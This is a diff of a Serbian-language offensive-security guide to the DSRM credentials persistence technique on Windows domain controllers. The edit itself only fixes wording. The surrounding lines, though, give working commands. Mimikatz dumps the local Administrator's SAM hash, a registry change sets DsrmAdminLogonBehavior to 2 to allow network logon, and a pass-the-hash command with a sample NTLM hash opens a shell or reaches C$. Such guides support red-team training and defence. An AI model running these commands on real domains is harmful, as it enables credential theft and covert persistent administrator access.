@@ -3,7 +3,7 @@
 # DSRM Kredencijali
 
 Postoji **lokalni administrator** nalog unutar svakog **DC**. Imajući administratorske privilegije na ovoj mašini, možete koristiti mimikatz da **izvučete hash lokalnog Administratora**. Zatim, modifikovanjem registra da **aktivirate ovu lozinku** kako biste mogli daljinski pristupiti ovom lokalnom Administrator korisniku.\
-Prvo treba da **izvučemo** **hash** korisnika **lokalnog Administratora** unutar DC:
+Prvo treba da **izvučemo** **hash** korisnika **lokalnog Administratora** unutar DC-a:
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
@@ -13,7 +13,7 @@ Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
-Zatim, koristeći PTH možete **navesti sadržaj C$ ili čak dobiti shell**. Imajte na umu da je za kreiranje nove powershell sesije sa tim hash-om u memoriji (za PTH) **"domen" koji se koristi samo ime DC mašine:**
+Zatim, koristeći PTH možete **prikazati sadržaj C$ ili čak dobiti shell**. Imajte na umu da je za kreiranje nove powershell sesije sa tim hash-om u memoriji (za PTH) **"domen" koji se koristi samo ime DC mašine:**
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
 #And in new spawned powershell you now can access via NTLM the content of C$
